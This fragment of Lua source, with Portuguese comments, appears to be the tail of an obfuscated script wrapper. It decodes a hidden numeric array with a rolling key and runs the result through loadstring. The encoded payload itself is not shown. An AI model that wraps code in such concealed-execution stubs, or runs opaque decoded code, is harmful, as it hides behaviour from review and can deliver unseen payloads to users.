    local function VM_1l00l(d, k, m)
        local R_0lI0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_0lI0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_0lI0)
    end

    -- Execution Guard
    local F_lIIlOOO = loadstring(VM_1l00l(B_10l0Il, 41, 5))
    if F_lIIlOOO then
        F_lIIlOOO(...)
    end
end)(...)
